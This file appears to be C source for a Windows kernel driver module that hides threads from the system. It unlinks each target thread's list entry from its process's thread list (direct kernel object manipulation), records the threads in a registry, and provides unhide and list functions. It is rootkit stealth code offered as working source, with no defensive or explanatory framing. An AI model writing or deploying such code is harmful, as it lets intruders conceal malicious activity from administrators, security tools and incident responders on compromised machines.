#include "ThreadModule.h"
#include "Offsets.h"
#include <ntddk.h>

NTKERNELAPI NTSTATUS PsLookupThreadByThreadId(HANDLE ThreadId,
                                               PETHREAD *Thread);
NTKERNELAPI PEPROCESS PsGetThreadProcess(PETHREAD Thread);

//
// Registry of hidden threads. Each entry keeps the original
// ThreadListEntry node so the thread can be re-linked later.
//
typedef struct _HIDDEN_THREAD_ENTRY {
  ULONG ThreadId;
  PLIST_ENTRY OriginalLinks;
  PETHREAD ThreadObject;
} HIDDEN_THREAD_ENTRY, *PHIDDEN_THREAD_ENTRY;

static HIDDEN_THREAD_ENTRY g_HiddenThreads[MAX_HIDDEN_THREADS];
static ULONG g_HiddenThreadCount = 0;
static FAST_MUTEX g_HiddenThreadLock;

static BOOLEAN IsThreadHiddenLocked(ULONG ThreadId) {
  ULONG i;
  for (i = 0; i < g_HiddenThreadCount; i++) {
    if (g_HiddenThreads[i].ThreadId == ThreadId)
      return TRUE;
  }
  return FALSE;
}

static BOOLEAN IsThreadHidden(ULONG ThreadId) {
  BOOLEAN found;
  ExAcquireFastMutex(&g_HiddenThreadLock);
  found = IsThreadHiddenLocked(ThreadId);
  ExReleaseFastMutex(&g_HiddenThreadLock);
  return found;
}

static BOOLEAN AddHiddenThread(ULONG ThreadId, PLIST_ENTRY OriginalLinks,
                               PETHREAD ThreadObject) {
  BOOLEAN success = FALSE;
  ExAcquireFastMutex(&g_HiddenThreadLock);
  if (IsThreadHiddenLocked(ThreadId))
    goto exit;
  if (g_HiddenThreadCount >= MAX_HIDDEN_THREADS)
    goto exit;
  g_HiddenThreads[g_HiddenThreadCount].ThreadId = ThreadId;
  g_HiddenThreads[g_HiddenThreadCount].OriginalLinks = OriginalLinks;
  g_HiddenThreads[g_HiddenThreadCount].ThreadObject = ThreadObject;
  g_HiddenThreadCount++;
  success = TRUE;
exit:
  ExReleaseFastMutex(&g_HiddenThreadLock);
  return success;
}

static BOOLEAN RemoveHiddenThread(ULONG ThreadId) {
  ULONG i;
  ExAcquireFastMutex(&g_HiddenThreadLock);
  for (i = 0; i < g_HiddenThreadCount; i++) {
    if (g_HiddenThreads[i].ThreadId == ThreadId) {
      g_HiddenThreads[i] = g_HiddenThreads[g_HiddenThreadCount - 1];
      g_HiddenThreadCount--;
      ExReleaseFastMutex(&g_HiddenThreadLock);
      return TRUE;
    }
  }
  ExReleaseFastMutex(&g_HiddenThreadLock);
  return FALSE;
}

NTSTATUS ThreadModuleInitialize(VOID) {
  ExInitializeFastMutex(&g_HiddenThreadLock);
  g_HiddenThreadCount = 0;

  DbgPrint("ThreadModule initialized.\n");
  return STATUS_SUCCESS;
}

VOID ThreadModuleCleanup(VOID) {
  ULONG i;

  ExAcquireFastMutex(&g_HiddenThreadLock);
  for (i = 0; i < g_HiddenThreadCount; i++) {
    if (g_HiddenThreads[i].ThreadObject) {
      ObDereferenceObject(g_HiddenThreads[i].ThreadObject);
      g_HiddenThreads[i].ThreadObject = NULL;
    }
  }
  g_HiddenThreadCount = 0;
  ExReleaseFastMutex(&g_HiddenThreadLock);

  DbgPrint("ThreadModule cleaned up.\n");
}

NTSTATUS ThreadHide(ULONG ThreadId) {
  NTSTATUS status = STATUS_SUCCESS;
  PETHREAD targetThread = NULL;
  PEPROCESS owningProcess = NULL;
  ULONG threadListOffset = GetThreadListEntryOffset();
  ULONG lockOffset = GetThreadLockOffset();
  PLIST_ENTRY threadListEntry;
  PEX_PUSH_LOCK listLock;

  if (ThreadId == 0)
    return STATUS_INVALID_PARAMETER;

  if (threadListOffset == 0 || lockOffset == 0)
    return STATUS_UNSUCCESSFUL;

  if (IsThreadHidden(ThreadId))
    return STATUS_SUCCESS;

  status = PsLookupThreadByThreadId(ULongToHandle(ThreadId), &targetThread);
  if (!NT_SUCCESS(status))
    return status;

  owningProcess = PsGetThreadProcess(targetThread);
  if (!owningProcess) {
    ObDereferenceObject(targetThread);
    return STATUS_UNSUCCESSFUL;
  }

  threadListEntry = (PLIST_ENTRY)((PUCHAR)targetThread + threadListOffset);

  if (!AddHiddenThread(ThreadId, threadListEntry, targetThread)) {
    ObDereferenceObject(targetThread);
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  //
  // The kernel walks ETHREAD.ThreadListEntry under the thread's own push lock
  // (PsEnumerateProcesses, NtQuerySystemInformation, thread exit). Unlinking
  // without it races those walks and corrupts the per-process thread list.
  //
  listLock = (PEX_PUSH_LOCK)((PUCHAR)targetThread + lockOffset);

  ExAcquirePushLockExclusive(listLock);
  __try {
    RemoveEntryList(threadListEntry);
    threadListEntry->Flink = threadListEntry;
    threadListEntry->Blink = threadListEntry;
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    status = GetExceptionCode();
  }
  ExReleasePushLockExclusive(listLock);

  if (!NT_SUCCESS(status)) {
    RemoveHiddenThread(ThreadId);
    ObDereferenceObject(targetThread);
    DbgPrint("Hide thread %lu faulted: 0x%X\n", ThreadId, status);
    return status;
  }

  DbgPrint("Hidden thread %lu.\n", ThreadId);
  return STATUS_SUCCESS;
}

NTSTATUS ThreadUnhide(ULONG ThreadId) {
  NTSTATUS status = STATUS_SUCCESS;
  PETHREAD targetThread = NULL;
  PLIST_ENTRY originalLinks = NULL;
  ULONG threadListOffset = GetThreadListEntryOffset();
  ULONG threadListHeadOffset = GetThreadListHeadOffset();
  ULONG lockOffset = GetProcessLockOffset();
  ULONG i;

  if (ThreadId == 0)
    return STATUS_INVALID_PARAMETER;

  if (threadListOffset == 0 || threadListHeadOffset == 0 || lockOffset == 0)
    return STATUS_UNSUCCESSFUL;

  ExAcquireFastMutex(&g_HiddenThreadLock);
  for (i = 0; i < g_HiddenThreadCount; i++) {
    if (g_HiddenThreads[i].ThreadId == ThreadId) {
      originalLinks = g_HiddenThreads[i].OriginalLinks;
      targetThread = g_HiddenThreads[i].ThreadObject;
      break;
    }
  }
  ExReleaseFastMutex(&g_HiddenThreadLock);

  if (!originalLinks || !targetThread)
    return STATUS_NOT_FOUND;

  PEPROCESS owningProcess = PsGetThreadProcess(targetThread);

  if (owningProcess) {
    PLIST_ENTRY processThreadList =
        (PLIST_ENTRY)((PUCHAR)owningProcess + threadListHeadOffset);
    // The relink target is the owning process's thread list, so its EPROCESS
    // push lock is the one that has to be held here.
    PEX_PUSH_LOCK listLock =
        (PEX_PUSH_LOCK)((PUCHAR)owningProcess + lockOffset);

    ExAcquirePushLockExclusive(listLock);
    __try {
      InsertHeadList(processThreadList, originalLinks);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
      status = GetExceptionCode();
      DbgPrint("Unhide thread %lu faulted: 0x%X\n", ThreadId, status);
    }
    ExReleasePushLockExclusive(listLock);
  } else {
    DbgPrint("Thread %lu owner process exited while hidden.\n", ThreadId);
  }

  ObDereferenceObject(targetThread);
  RemoveHiddenThread(ThreadId);

  DbgPrint("Revealed thread %lu.\n", ThreadId);
  return status;
}

NTSTATUS ThreadListHidden(PTHREAD_LIST_RESPONSE Response) {
  ULONG i;

  if (!Response)
    return STATUS_INVALID_PARAMETER;

  ExAcquireFastMutex(&g_HiddenThreadLock);
  Response->Count = g_HiddenThreadCount;
  for (i = 0; i < g_HiddenThreadCount; i++)
    Response->ThreadIds[i] = g_HiddenThreads[i].ThreadId;
  ExReleaseFastMutex(&g_HiddenThreadLock);

  return STATUS_SUCCESS;
}